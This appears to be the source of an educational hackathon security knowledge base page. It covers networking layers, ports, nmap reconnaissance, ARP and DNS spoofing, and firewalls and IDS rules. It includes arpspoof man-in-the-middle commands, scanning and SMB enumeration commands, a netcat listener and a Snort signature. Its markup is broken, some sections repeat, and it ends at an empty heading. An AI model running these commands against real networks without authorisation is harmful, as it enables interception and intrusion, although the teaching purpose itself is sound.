<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cybersecurity Hackathon Knowledge Base</title>
<style>
:root{
  --bg:#0b0f14; --panel:#111823; --panel2:#0e1420; --line:#1f2b3a;
  --text:#dbe4ee; --dim:#a3b2c3; --accent:#3ddc97; --accent2:#f0a93f;
  --danger:#e8577a; --mono:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Inter,Roboto,Helvetica,Arial,sans-serif;
}
*{box-sizing:border-box;}
html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.65;}
body{min-height:100vh;}
header.top{
  position:sticky;top:0;z-index:20;background:rgba(11,15,20,.94);backdrop-filter:blur(6px);
  border-bottom:1px solid var(--line);padding:16px 24px;
}
.brand{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;}
.brand .mark{font-family:var(--mono);color:var(--accent);font-size:13px;letter-spacing:.04em;}
.brand h1{font-size:19px;margin:0;font-weight:600;color:var(--text);}
.brand .tag{font-size:12.5px;color:var(--dim);font-family:var(--mono);}
nav.chunks{display:flex;gap:6px;overflow-x:auto;padding:14px 24px 0;max-width:1180px;margin:0 auto;}
nav.chunks button{
  font-size:14px;flex:0 0 auto;background:var(--panel);border:1px solid var(--line);color:var(--dim);
  padding:10px 16px;border-radius:8px 8px 0 0;font-family:var(--mono);font-size:12.5px;
  cursor:pointer;white-space:nowrap;transition:color .15s,background .15s;
}
nav.chunks button .n{color:var(--accent2);margin-right:6px;}
nav.chunks button:hover{color:var(--text);}
nav.chunks button.active{background:var(--panel2);color:var(--text);border-bottom:1px solid var(--panel2);border-top:2px solid var(--accent);}
main{max-width:1180px;margin:0 auto;padding:0 24px 80px;}
section.chunk{display:none;background:var(--panel2);border:1px solid var(--line);border-radius:0 8px 8px 8px;padding:22px 22px 6px;margin-top:0;}
section.chunk.active{display:block;}
.chunk-head{display:flex;justify-content:space-between;align-items:flex-start;gap:16px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:16px;margin-bottom:16px;}
.chunk-head h2{margin:0 0 4px;font-size:22px;}
.chunk-head p{margin:0;color:var(--dim);font-size:14px;max-width:68ch;}
.badge{font-family:var(--mono);font-size:11px;color:var(--accent2);border:1px solid #3a2f17;background:#1a150a;padding:4px 9px;border-radius:20px;white-space:nowrap;}
.subnav{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:18px;}
.subnav button{
  background:var(--panel);border:1px solid var(--line);color:var(--dim);padding:8px 14px;
  border-radius:20px;font-size:14px;cursor:pointer;font-family:var(--sans);
}
.subnav button.active{background:rgba(61,220,151,.12);border-color:var(--accent);color:var(--accent);}
article.subpage{display:none;max-width:78ch;}
article.subpage.active{display:block;animation:fade .25s ease;}
@keyframes fade{from{opacity:0;transform:translateY(3px);}to{opacity:1;transform:none;}}
article.subpage h3{font-size:24px;margin:0 0 4px;}
article.subpage .lede{color:var(--dim);font-size:15.5px;margin:0 0 16px;padding-bottom:14px;border-bottom:1px dashed var(--line);font-style:italic;}
article.subpage h4{font-size:17px;color:var(--accent);margin:22px 0 8px;font-family:var(--mono);}
article.subpage h5{font-size:15px;color:var(--accent2);margin:14px 0 6px;font-family:var(--mono);}
article.subpage p{color:#c7d2de;font-size:16.5px;margin:0 0 14px;}
article.subpage ul,article.subpage ol{margin:0 0 14px;padding-left:22px;}
article.subpage li{font-size:16px;margin:5px 0;color:#c7d2de;}
article.subpage li b, p b{color:var(--text);}
a{color:var(--accent);}
a:hover{color:var(--accent2);}
code{font-family:var(--mono);background:#0d1623;border:1px solid var(--line);padding:1px 5px;border-radius:4px;font-size:14px;color:#9fe8c9;}
pre{background:#060a10;border:1px solid var(--line);border-radius:8px;padding:12px 14px;overflow-x:auto;margin:8px 0 16px;}
pre code{border:0;background:none;padding:0;color:#bfe3d6;font-size:14px;line-height:1.6;}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px;}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:14px;}
@media(max-width:720px){.grid2,.grid3{grid-template-columns:1fr;}}
.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px 14px;}
.card h5{margin:0 0 6px;}
.box{border-left:3px solid var(--accent);background:rgba(61,220,151,.06);padding:10px 14px;border-radius:0 8px 8px 0;margin:10px 0 16px;}
.box.warn{border-color:var(--danger);background:rgba(232,87,122,.07);}
.box p{margin:0;font-size:15.5px;}
.foot-note{color:var(--dim);font-size:12.5px;border-top:1px dashed var(--line);margin-top:16px;padding-top:10px;}
table{width:100%;min-width:560px;border-collapse:collapse;margin:0;font-size:14.5px;}
th,td{border:1px solid var(--line);padding:6px 10px;text-align:left;}
th{background:var(--panel);color:var(--accent2);font-family:var(--mono);font-size:12px;}
td{color:#c7d2de;}
.glos-search{width:100%;padding:10px 14px;background:var(--panel);border:1px solid var(--line);border-radius:8px;color:var(--text);font-family:var(--mono);font-size:13px;margin-bottom:16px;}
.glos-group h4{margin-top:26px;}
dl.terms{margin:0;}
dl.terms dt{font-family:var(--mono);color:var(--accent);font-size:15px;margin-top:10px;}
dl.terms dd{margin:2px 0 0;color:#c7d2de;font-size:15.5px;}
dl.terms dd b{color:var(--text);}
footer{max-width:1180px;margin:0 auto;padding:30px 24px 60px;color:var(--dim);font-size:12.5px;font-family:var(--mono);}
::-webkit-scrollbar{height:8px;width:8px;}
::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px;}

.skip{position:absolute;left:-999px;top:8px;background:var(--accent);color:#04120b;padding:10px 14px;border-radius:6px;z-index:50;font-weight:600}
.skip:focus{left:8px}
:focus-visible{outline:3px solid var(--accent2);outline-offset:2px}
.tablewrap{overflow-x:auto;margin:10px 0 18px}
nav.groups{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
nav.groups button{flex:1 1 240px;text-align:left;background:var(--panel);border:1px solid var(--line);color:var(--text);padding:10px 14px;border-radius:8px;cursor:pointer;font-family:var(--sans);font-size:15px}
nav.groups button small{display:block;color:var(--dim);font-size:13px;margin-top:2px}
nav.groups button[aria-selected="true"]{border-color:var(--accent);background:rgba(61,220,151,.12)}
nav.chunks button[hidden]{display:none}
.glos-search{font-size:15px}
.sr{position:absolute;left:-999px}
.level td:first-child{font-weight:600;white-space:nowrap;color:var(--text)}

{
  id:1, title:"Networking & Infrastructure Security", level:"Foundation",
  desc:"How data actually moves across wires and airwaves, how to observe it, and how every layer of the stack can be abused. This is the substrate everything else in security sits on — skipping it makes every later chapter feel like memorized trivia instead of understood mechanics.",
  subs:[
{t:"The OSI & TCP/IP Models", h:`
<h3>1.1 The OSI & TCP/IP Models</h3>
<p class="lede">Before attacking or defending anything, you need a mental map of where data lives as it travels. Every vulnerability class in this entire knowledge base can be pinned to a layer — learning to ask "which layer is this happening at?" is the single most useful reflex in security.</p>

<p>Networking is taught through two overlapping reference models. The <b>OSI (Open Systems Interconnection) model</b> is the academic, 7-layer description; the <b>TCP/IP model</b> is the practical, 4-layer model that the real internet actually runs on. You'll see both used interchangeably in write-ups, so know how they map onto each other.</p>

<div class="tablewrap" role="region" aria-label="Data table" tabindex="0"><table>
<tr><th scope="col">OSI Layer</th><th scope="col">Name</th><th scope="col">TCP/IP Layer</th><th scope="col">What lives here</th><th scope="col">Example attacks</th></tr>
<tr><td>7</td><td>Application</td><td rowspan="3">Application</td><td>HTTP, DNS, FTP, SMTP, SSH</td><td>SQLi, XSS, phishing</td></tr>
<tr><td>6</td><td>Presentation</td><td>Encryption, encoding (TLS, JPEG)</td><td>Downgrade attacks</td></tr>
<tr><td>5</td><td>Session</td><td>Session establishment (NetBIOS, RPC)</td><td>Session hijacking</td></tr>
<tr><td>4</td><td>Transport</td><td>Transport</td><td>TCP, UDP — ports, reliability</td><td>SYN flood, port scanning</td></tr>
<tr><td>3</td><td>Network</td><td>Internet</td><td>IP, ICMP, routing</td><td>IP spoofing, route poisoning</td></tr>
<tr><td>2</td><td>Data Link</td><td rowspan="2">Network Access (Link)</td><td>MAC addresses, Ethernet, ARP, switches</td><td>ARP spoofing, VLAN hopping</td></tr>
<tr><td>1</td><td>Physical</td><td>Cables, radio, voltage, bits on the wire</td><td>Wiretapping, jamming</td></tr>
</table></div>

<h4>Why layering matters</h4>
<p>Each layer only trusts the layer directly below it to deliver data correctly — it has no way to verify the layer told the truth. This is the root cause of almost every network-level attack in this chapter: ARP has no authentication, so a host simply believes whichever MAC address claims an IP address; IP has no authentication, so a packet's claimed source address can be forged; DNS responses were historically unauthenticated, so an attacker who can inject a faster response wins. Every layer up the stack inherits the trust assumptions — and trust failures — of the layers below it. Understanding this single idea explains spoofing, hijacking, and most man-in-the-middle techniques without memorizing them as a list.</p>

<h4>Encapsulation</h4>
<p>As data moves down the stack to be sent, each layer wraps ("encapsulates") the layer above's data with its own header. A web request starts as an HTTP payload, gets a TCP header (port, sequence numbers) to become a segment, gets an IP header (source/destination address) to become a packet, and gets an Ethernet header (MAC addresses) to become a frame before it ever touches the wire. When you read a packet capture, you are reading this nested structure from the outside in — Wireshark's layer-by-layer pane view literally mirrors encapsulation.</p>

<h4>Reading headers directly</h4>
<p>You rarely need to trust a tool's summary line once you can read the bytes. An Ethernet frame starts with a 6-byte destination MAC, 6-byte source MAC, and a 2-byte EtherType (<code>0x0800</code> = IPv4, <code>0x0806</code> = ARP, <code>0x86DD</code> = IPv6). The IPv4 header that follows starts with a version/IHL byte (usually <code>0x45</code>, meaning version 4 and a 20-byte header), a total-length field, a TTL byte, and a protocol byte (<code>6</code> = TCP, <code>17</code> = UDP, <code>1</code> = ICMP). In Wireshark, click any field in the packet-detail pane and the matching bytes highlight in the hex pane — do this a few times until the layout stops feeling arbitrary.</p>
<h4>Headers are a trust chain, not a trust guarantee</h4>
<p>A receiving host builds its picture of "who sent this" entirely from header fields the sender wrote and the sender fully controls. The stack validates checksums (did the bytes arrive intact?) but almost nothing validates identity (did the claimed sender actually send this?) below the application layer, and even there identity usually depends on a credential, not the network itself. This single fact explains spoofing, hijacking and most man-in-the-middle techniques in this chapter: they all exploit a layer believing a field it has no way to verify.</p>
<table><tr><th scope="col">Layer</th><th scope="col">Unverified field an attacker can forge</th><th scope="col">Resulting attack</th></tr>
<tr><td>Data Link</td><td>Source MAC in an ARP reply</td><td>ARP spoofing</td></tr>
<tr><td>Network</td><td>Source IP in a packet</td><td>IP spoofing, reflected DoS</td></tr>
<tr><td>Transport</td><td>Source port, sequence number (if guessable)</td><td>TCP session hijack / RST injection</td></tr>
<tr><td>Application</td><td>Host header, DNS answer</td><td>Virtual-host confusion, DNS spoofing</td></tr></table>
`},

{t:"IP, TCP, UDP & Ports in Depth", h:`
<h3>1.2 IP, TCP, UDP & Ports in Depth</h3>
<p class="lede">The transport and network layers decide how two machines find each other and whether their conversation is reliable. Almost every scanning and exploitation technique downstream depends on understanding exactly how these protocols behave.</p>

<h4>IP addressing</h4>
<p><b>IPv4</b> addresses are 32-bit numbers written as four decimal octets (e.g. <code>192.168.1.10</code>), giving roughly 4.3 billion addresses — long since exhausted for public use, which is why <b>NAT (Network Address Translation)</b> and private ranges (<code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>) exist. <b>IPv6</b> uses 128-bit addresses written in hex groups (e.g. <code>2001:db8::1</code>) and is increasingly relevant in hackathon infra/forensics tasks because many defenders still only monitor IPv4.</p>
<p>A <b>subnet mask</b> or <b>CIDR (Classless Inter-Domain Routing) notation</b> (e.g. <code>/24</code>) describes how many bits of an address identify the network versus the host. <code>192.168.1.0/24</code> means the first 24 bits are fixed (the network), leaving 8 bits (256 addresses) for hosts — this is the number you'll feed into nmap for subnet-wide scans.</p>

<h4>TCP: reliable, connection-oriented</h4>
<p>TCP (Transmission Control Protocol) guarantees ordered, reliable delivery through a <b>three-way handshake</b> and sequence numbers:</p>
<pre><code>Client                      Server
  | --------- SYN --------->  |   (I want to connect, my seq = x)
  | <----- SYN-ACK ---------  |   (ok, my seq = y, ack your x+1)
  | --------- ACK --------->  |   (ack your y+1 — connection open)</code></pre>
<p>Every byte sent is tracked by sequence number so lost packets can be retransmitted and reordered packets reassembled correctly. This reliability costs overhead — more round trips, more state kept on both ends — which is exactly what a <b>SYN flood</b> abuses: the attacker sends a flood of SYN packets (often with spoofed source IPs) and never completes the handshake, leaving the server holding a growing table of half-open connections until it runs out of memory/connection slots. The classic mitigation is <b>SYN cookies</b>, where the server avoids storing per-connection state for an unacknowledged SYN by encoding the state cryptographically into the SYN-ACK sequence number itself.</p>

<h4>UDP: fast, connectionless</h4>
<p>UDP (User Datagram Protocol) sends a datagram with no handshake, no guarantee of delivery or order, and no congestion control. It's used where speed matters more than reliability — DNS queries, video streaming, VoIP, and online gaming. Because there's no handshake, UDP is also the protocol of choice for <b>reflection/amplification DDoS attacks</b>: an attacker sends a small spoofed-source UDP request to a service that returns a much larger response (DNS, NTP, memcached are classic amplifiers) directly to the spoofed victim, multiplying the attacker's bandwidth many times over.</p>

<h4>Ports: the application's mailbox number</h4>
<p>A port is a 16-bit number (0–65535) that lets a single IP address host many simultaneous services. Ports 0–1023 are <b>well-known/system ports</b> (require root/admin privileges to bind on Unix), 1024–49151 are <b>registered ports</b>, and 49152–65535 are <b>ephemeral ports</b> used as the temporary client-side port for outgoing connections.</p>
<div class="tablewrap" role="region" aria-label="Data table" tabindex="0"><table>
<tr><th scope="col">Port</th><th scope="col">Service</th><th scope="col">Protocol</th><th scope="col">Notes</th></tr>
<tr><td>20/21</td><td>FTP</td><td>TCP</td><td>Data/control — unencrypted by default</td></tr>
<tr><td>22</td><td>SSH</td><td>TCP</td><td>Encrypted remote shell; also tunnels/SFTP</td></tr>
<tr><td>23</td><td>Telnet</td><td>TCP</td><td>Unencrypted remote shell — legacy, avoid</td></tr>
<tr><td>25</td><td>SMTP</td><td>TCP</td><td>Mail sending/relay</td></tr>
<tr><td>53</td><td>DNS</td><td>TCP/UDP</td><td>UDP for queries, TCP for zone transfers/large replies</td></tr>
<tr><td>67/68</td><td>DHCP</td><td>UDP</td><td>Automatic IP address assignment</td></tr>
<tr><td>80/443</td><td>HTTP/HTTPS</td><td>TCP</td><td>Web — 443 is TLS-wrapped</td></tr>
<tr><td>110/143</td><td>POP3/IMAP</td><td>TCP</td><td>Mail retrieval</td></tr>
<tr><td>445</td><td>SMB</td><td>TCP</td><td>Windows file sharing — frequent attack surface</td></tr>
<tr><td>3306</td><td>MySQL</td><td>TCP</td><td>Database — should never be internet-facing</td></tr>
<tr><td>3389</td><td>RDP</td><td>TCP</td><td>Windows remote desktop</td></tr>
<tr><td>5432</td><td>PostgreSQL</td><td>TCP</td><td>Database</td></tr>
</table></div>
<p>A port's <b>state</b> during a scan is reported as <b>open</b> (something is listening and responded), <b>closed</b> (a response came back actively refusing, e.g. a TCP RST), or <b>filtered</b> (no response at all — usually a firewall silently dropping the probe). Distinguishing closed from filtered is often the difference between "nothing is there" and "something is there but hidden," and is a recurring theme in recon-heavy hackathon challenges.</p>
<h4>The TCP state machine</h4>
<p>TCP tracks a connection through explicit states: <code>CLOSED → LISTEN → SYN_RECEIVED → ESTABLISHED → FIN_WAIT → CLOSED</code>. A normal client-side connection moves <code>CLOSED → SYN_SENT → ESTABLISHED</code> after the three-way handshake (SYN, SYN-ACK, ACK). Scanners abuse the fact that a host must reply even to packets that don't complete a handshake: a SYN to a closed port returns RST immediately (port closed), a SYN to an open port returns SYN-ACK (port open, and a full scan then sends RST to tear down without ever finishing the handshake — this is exactly what nmap's default <code>-sS</code> does, which is why it's called a "stealth" or half-open scan: no application ever sees a completed connection).</p>
<h4>Why UDP scanning is slow and unreliable</h4>
<p>UDP has no handshake, so a scanner cannot distinguish "open and the service chose not to reply" from "the packet was dropped in transit." The only reliable signal is negative: an RFC-compliant closed UDP port replies with an ICMP "port unreachable" message. Firewalls routinely rate-limit or drop these ICMP replies, which is why UDP scans (<code>nmap -sU</code>) are an order of magnitude slower than TCP scans and why "open|filtered" is a common, honest, unresolved result you should report as exactly that rather than guessing.</p>
<h4>Common ports worth memorizing</h4>
<table><tr><th scope="col">Port</th><th scope="col">Service</th><th scope="col">Why it matters in a CTF/hackathon</th></tr>
<tr><td>21/22</td><td>FTP / SSH</td><td>Anonymous FTP, weak SSH keys, version-specific CVEs</td></tr>
<tr><td>25/110/143</td><td>SMTP/POP3/IMAP</td><td>Often reveal internal hostnames in banners</td></tr>
<tr><td>53</td><td>DNS</td><td>Zone transfers (<code>dig axfr</code>), tunnelling</td></tr>
<tr><td>139/445</td><td>SMB</td><td>Null sessions, EternalBlue-class bugs, share enumeration</td></tr>
<tr><td>3306/5432</td><td>MySQL/Postgres</td><td>Exposed databases, default credentials</td></tr>
<tr><td>6379</td><td>Redis</td><td>Often unauthenticated by default — full read/write</td></tr>
<tr><td>8080/8443</td><td>Alt HTTP(S)</td><td>Admin panels, dev servers left running</td></tr></table>
`},

{t:"Reconnaissance & Scanning", h:`
<h3>1.3 Reconnaissance & Scanning</h3>
<p class="lede">Recon is the discipline of learning everything observable about a target before touching it meaningfully. In a hackathon it is almost always the first thing you do on any "exploit this box/service" challenge, and skipping it is the most common reason teams waste time attacking the wrong thing.</p>

<h4>Passive vs active recon</h4>
<p><b>Passive reconnaissance</b> gathers information without directly interacting with the target — WHOIS records, public DNS records, search-engine caches, certificate transparency logs, job postings that reveal the tech stack. It leaves no trace on the target because you never touch it. <b>Active reconnaissance</b> sends traffic directly to the target — port scans, banner grabs, directory brute-forcing — and is detectable by logging/IDS. Real engagements plan around this distinction (rules of engagement usually dictate how aggressive you're allowed to be); in a hackathon it mostly just affects how "noisy" your approach needs to be for a stealth-scored challenge.</p>

<h4>nmap — the standard port scanner</h4>
<p>nmap (Network Mapper) is the default tool for host discovery, port scanning, service/version detection, and OS fingerprinting. Its scan types differ in how they establish (or deliberately don't establish) a TCP connection:</p>
<ul>
<li><b>TCP connect scan (<code>-sT</code>):</b> completes the full three-way handshake — reliable, but loud and logged everywhere, since it opens a genuine connection at the OS level.</li>
<li><b>SYN scan / "half-open" scan (<code>-sS</code>):</b> sends a SYN, and on receiving SYN-ACK immediately sends a RST instead of completing the handshake — faster and stealthier since many applications never log a connection that was never fully opened. Requires raw-socket privileges (root/admin).</li>
<li><b>UDP scan (<code>-sU</code>):</b> much slower and less reliable since UDP gives no handshake to confirm a port is open — nmap infers "open" from an application response, and "closed" from an ICMP port-unreachable message; silence is ambiguous (open or filtered).</li>
</ul>
<pre><code>nmap -sV -sC -p- -T4 target        # service/version detection + default scripts, all 65535 ports
nmap -sU --top-ports 20 target     # scan the 20 most common UDP ports
nmap -O target                     # OS fingerprinting via TCP/IP stack quirks
nmap -A target                     # aggressive: OS + version + scripts + traceroute
nmap --script vuln target          # run nmap's vulnerability-detection script category</code></pre>

<h4>Other core recon tools</h4>
<ul>
<li><code>netcat (nc)</code> — the "TCP/IP Swiss army knife": banner grabbing (<code>nc target 80</code> then type <code>HEAD / HTTP/1.0</code>), ad-hoc listeners (<code>nc -lvnp 4444</code>), and file transfer or reverse shells.</li>
<li><code>Wireshark</code>/<code>tshark</code> — full packet capture and analysis with a GUI (Wireshark) or CLI (tshark); essential both for live recon and for post-hoc PCAP forensics challenges.</li>
<li><b>Shodan / Censys</b> — search engines that continuously scan the entire internet and index what's listening on every IP, letting you search by banner, service, or even default-credential signatures without ever touching the target yourself (passive recon).</li>
<li><code>theHarvester</code> — aggregates emails, subdomains, and names from public sources for a target organization.</li>
<li><code>whois</code>, <code>dig</code>/<code>nslookup</code> — domain registration lookups and DNS record queries (A, AAAA, MX, TXT, NS records).</li>
<li><code>crt.sh</code> — searches Certificate Transparency logs, which often leak every subdomain a company has ever issued a TLS certificate for, even internal-sounding ones.</li>
</ul>

<h4>Reading a packet capture efficiently</h4>
<p>Given a PCAP file in a forensics or network challenge, the fast workflow in Wireshark is: <b>Statistics → Protocol Hierarchy</b> to see what protocols are present at a glance; <b>Statistics → Conversations</b> to see which hosts talked to which; a display filter like <code>http.request</code> or <code>tcp.port==80</code> to narrow the noise; <b>right-click → Follow → TCP/HTTP Stream</b> to reassemble an entire conversation into readable form; and <b>File → Export Objects</b> to pull out any files that were transferred in the clear over HTTP or FTP.</p>
<div class="box warn"><p><b>Common trap:</b> a PCAP that "looks empty" of anything interesting at the HTTP layer is often hiding the real traffic in DNS queries (data exfiltration via subdomain encoding) or ICMP payloads — always check Protocol Hierarchy before assuming nothing is there.</p></div>
<h4>A disciplined scanning sequence</h4>
<p>Running every nmap flag at once produces noisy, slow, hard-to-read output. A methodical order gets you to useful findings faster:</p>
<pre><code># 1. Is the host alive and what's open, fast
nmap -sn 10.10.10.0/24                 # host discovery only
nmap -p- --min-rate 5000 10.10.10.5    # every TCP port, fast
# 2. Now that you know which ports, go deep only on those
nmap -sC -sV -p22,80,443,3306 10.10.10.5   # default scripts + versions
# 3. Targeted enumeration per open service
whatweb http://10.10.10.5              # web stack fingerprint
smbclient -L //10.10.10.5 -N           # anonymous SMB share listing
enum4linux -a 10.10.10.5               # SMB/AD enumeration</code></pre>
<p>Run port discovery before version detection (<code>-sV</code>) on the full range — <code>-sV</code> against 65535 ports is needlessly slow; narrow first, then deepen.</p>
<h4>Fingerprinting without touching the target</h4>
<p>Passive reconnaissance gathers information without sending packets to the target at all, so it cannot be logged by the target: certificate transparency logs (<code>crt.sh</code>) reveal every subdomain ever issued a TLS certificate; <code>whois</code> and ASN lookups reveal ownership and IP ranges; job postings and GitHub repos leak internal tool names and tech stacks. For any assessment where stealth matters, exhaust passive sources before the first active packet.</p>
<h4>Reading a capture efficiently (expanded)</h4>
<p>In Wireshark, build the habit of filtering before scrolling: <code>http.request</code> isolates every request in a noisy capture; <code>tcp.flags.syn==1 and tcp.flags.ack==0</code> isolates connection attempts, useful for spotting a scan; <code>ip.addr==10.10.10.5 and tcp.port==445</code> isolates one conversation. Follow → TCP Stream (right-click any packet) reconstructs the full back-and-forth as text, which is almost always faster than reading packet-by-packet.</p>
`},

{t:"Layer 2/3 Attacks: ARP & DNS Spoofing, MITM", h:`
<h3>1.4 Layer 2/3 Attacks: ARP Spoofing, DNS Spoofing & MITM</h3>
<p class="lede">These attacks exploit the exact trust gap described in section 1.1: lower layers have no built-in way to verify that a response is authentic, only that it arrived in the expected format.</p>

<h4>ARP and ARP spoofing</h4>
<p>ARP (Address Resolution Protocol) translates IP addresses to MAC addresses on a local network segment. When host A wants to talk to IP <code>192.168.1.5</code>, it broadcasts "who has 192.168.1.5?" and whichever host replies "I do, here's my MAC" gets believed — with zero authentication. ARP spoofing (or ARP poisoning) abuses this by having an attacker reply to ARP requests claiming to own the gateway's IP (or the victim's IP), poisoning the ARP caches of both the victim and the router. Traffic between them now physically routes through the attacker's machine first, who can read it, modify it, and forward it on — a classic <b>man-in-the-middle (MITM)</b> position. Tools: <code>arpspoof</code> (from the dsniff suite), <code>ettercap</code>, <code>bettercap</code>.</p>
<pre><code># Example with arpspoof — poison both directions
arpspoof -i eth0 -t &lt;victim-ip&gt; &lt;gateway-ip&gt;
arpspoof -i eth0 -t &lt;gateway-ip&gt; &lt;victim-ip&gt;
# Enable IP forwarding so the victim's connection still works through you
echo 1 > /proc/sys/net/ipv4/ip_forward</code></pre>

<h4>DNS spoofing / cache poisoning</h4>
<p>DNS historically runs over unauthenticated UDP: a resolver sends a query and accepts whichever response arrives first that matches the expected transaction ID and source port — an attacker who can guess or race that response (especially from a MITM position already achieved via ARP spoofing) can return a forged IP address for a domain name, silently redirecting the victim to an attacker-controlled server. <b>DNSSEC (DNS Security Extensions)</b> was designed to fix this by cryptographically signing DNS records, but adoption is still partial across the internet — worth knowing conceptually even though most hackathon challenges won't require configuring it.</p>

<h4>Once you're in the middle: sniffing and downgrade attacks</h4>
<p>Being positioned as a MITM is not itself the goal — it's the vantage point that enables further attacks: passively sniffing any unencrypted protocol (HTTP, FTP, Telnet, plain SMTP) for credentials in the clear; actively stripping TLS by intercepting the initial unencrypted HTTP request before a redirect to HTTPS happens (<b>SSL/TLS stripping</b>, famously automated by the tool <code>sslstrip</code>); or injecting malicious content into unencrypted HTTP responses on the fly.</p>

<h4>Defenses</h4>
<ul>
<li><b>Dynamic ARP Inspection (DAI)</b> on managed switches validates ARP packets against a trusted binding table (often built from DHCP snooping records) and drops forged ones.</li>
<li><b>Port security</b> on switches limits which MAC addresses are allowed on a given physical port.</li>
<li><b>HSTS (HTTP Strict Transport Security)</b> tells browsers to never downgrade a site to plain HTTP again, closing the sslstrip window.</li>
<li>Universally: prefer encrypted protocols (HTTPS, SSH, SFTP) so that even a successful MITM position yields only ciphertext.</li>
</ul>
<h4>ARP spoofing, step by step</h4>
<p>To sit between a victim and the gateway, an attacker sends two forged ARP replies: one to the victim claiming "I am the gateway" (mapping the gateway's IP to the attacker's MAC), and one to the gateway claiming "I am the victim." Both devices update their ARP caches and now send traffic for each other through the attacker, who forwards it on (so the victim sees no interruption) while reading or modifying it in transit. This only works on the same Layer 2 segment — ARP packets are not routed, so the attacker must already be on the local network or a connected switch port.</p>
<h4>DNS spoofing versus DNS cache poisoning</h4>
<p>These are often confused. <b>DNS spoofing</b> (on-path) requires the attacker to see the victim's DNS query in transit (for example, after an ARP-spoofing MITM) and race a forged reply before the real server answers. <b>DNS cache poisoning</b> (off-path, classically the Kaminsky attack) tricks a recursive resolver into caching a forged record for everyone who queries it, without needing to be on the victim's network at all, by guessing the 16-bit transaction ID and source port of a query the resolver is about to make. Modern resolvers randomize both fields and many validate with DNSSEC specifically to make this guess infeasible.</p>
<h4>Detection and defence beyond the chapter's detector</h4>
<ul><li><b>Dynamic ARP Inspection (DAI)</b> on managed switches validates ARP replies against a trusted DHCP-snooping binding table.</li><li><b>Static ARP entries</b> for critical hosts (gateway, DNS server) eliminate the attack for those specific hosts at the cost of manual maintenance.</li><li><b>DNSSEC</b> cryptographically signs DNS records so a resolver can reject a forged answer, though it does not encrypt the query itself — DoH/DoT address that separately.</li></ul>
`},

{t:"Firewalls, IDS/IPS & VPNs", h:`
<h3>1.5 Firewalls, IDS/IPS & VPNs</h3>
<p class="lede">These are the three most common perimeter and in-transit controls you'll be asked to read, configure, or reason about in blue-team-flavored challenges.</p>

<h4>Firewalls</h4>
<p>A firewall filters traffic according to rules. A <b>stateless (packet-filtering) firewall</b> evaluates each packet independently against rules on source/destination IP, port, and protocol — fast, but can't tell a legitimate reply packet from an unsolicited one without extra rules. A <b>stateful firewall</b> tracks the state of active connections (e.g. "this is a reply to a connection we initiated") and makes smarter allow/deny decisions as a result; virtually every modern firewall is stateful. A <b>next-generation firewall (NGFW)</b> adds application-layer awareness (it can tell "this is Slack traffic" rather than just "this is port 443 traffic") and integrates intrusion prevention.</p>
<p>On Linux, firewall rules are implemented with <code>iptables</code> (older, chain-based: INPUT/OUTPUT/FORWARD) or its modern successor <code>nftables</code>. In cloud environments, the equivalent is a <b>security group</b> (AWS/Azure-style, usually stateful and attached to an instance) or a <b>network ACL</b> (stateless, attached to a subnet).</p>
<pre><code># iptables: drop everything inbound except SSH and HTTP(S)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP</code></pre>

<h4>IDS vs IPS</h4>
<p>An <b>IDS (Intrusion Detection System)</b> passively monitors traffic (often from a mirrored/SPAN port) and raises alerts — it never blocks anything itself, which means it can never break legitimate traffic by mistake, at the cost of the attack already having happened by the time you're alerted. An <b>IPS (Intrusion Prevention System)</b> sits inline in the traffic path and can actively drop or reject malicious traffic in real time, at the cost of occasionally blocking a false positive.</p>
<p>Detection logic comes in two flavors. <b>Signature-based detection</b> matches traffic against a database of known attack patterns (very low false-positive rate, but blind to anything novel). <b>Anomaly-based detection</b> builds a baseline of "normal" behavior and flags deviations (can catch zero-days, but generates more false positives and needs tuning). Snort and Suricata are the two dominant open-source engines, both using a human-readable rule syntax:</p>
<pre><code>alert tcp any any -> any 80 (msg:"Possible XSS attempt"; content:"&lt;script&gt;"; sid:1000001;)</code></pre>
<p>This rule alerts whenever a TCP packet destined for port 80 contains the literal bytes <code>&lt;script&gt;</code> — a simplistic but illustrative signature. Reading rules like this (or writing one given a sample attack) is a common blue-team hackathon task.</p>

<h4>VPNs</h4>
<p>A VPN (Virtual Private Network) builds an encrypted tunnel between two endpoints over an untrusted network. A <b>site-to-site VPN</b> permanently connects two networks (e.g. two office branches); a <b>remote-access VPN</b> connects an individual client into a network on demand. The three protocols worth knowing: <b>IPsec</b> (operates at the network layer, widely used for site-to-site), <b>OpenVPN</b> (SSL/TLS-based, flexible, historically the default open-source choice), and <b>WireGuard</b> (modern, much smaller codebase, faster, increasingly the default recommendation for new deployments due to its simplicity and auditable cryptography).</p>
<h4>Stateful vs stateless filtering</h4>
<p>A <b>stateless</b> firewall evaluates every packet against its rule list independently — it has no memory, so to allow a reply it must have a separate rule permitting the return traffic, which is error-prone and often over-permissive. A <b>stateful</b> firewall tracks active connections in a state table and automatically allows return traffic belonging to a connection it saw initiated outbound, which is why "allow outbound, default-deny inbound" is sufficient on a stateful firewall but silently broken on a stateless one.</p>
<h4>Signature-based vs anomaly-based detection</h4>
